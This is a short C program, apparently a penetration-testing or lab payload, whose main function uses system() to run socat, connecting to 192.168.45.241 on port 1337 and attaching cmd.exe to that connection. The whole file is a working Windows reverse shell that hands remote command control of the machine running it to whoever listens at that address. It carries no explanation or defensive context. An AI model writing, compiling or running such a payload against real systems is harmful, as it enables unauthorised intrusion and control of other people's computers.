#include <stdlib.h>

int main()
{
    int i;

    i = system ("socat TCP4:192.168.45.241:1337 EXEC:'cmd.exe',pipes");

    return 0;
}